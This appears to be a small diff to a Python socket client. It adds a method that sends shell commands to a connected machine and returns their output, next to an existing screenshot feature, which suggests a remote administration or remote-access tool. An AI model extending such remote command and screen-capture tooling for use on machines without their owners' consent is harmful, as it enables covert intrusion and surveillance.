@@ -27,6 +27,11 @@ class Client:
     def disconnect(self):
         self.send(DISCONNECTED_MESSAGE)
 
+    def sendCommand(self, command: str):
+        self.send(f"cmd {command}")
+        output = self.conn.recv(1024)
+        return output
+
     def screenshot(self):
         self.send("screenshot")
         recvheader = int(self.conn.recv(1024))
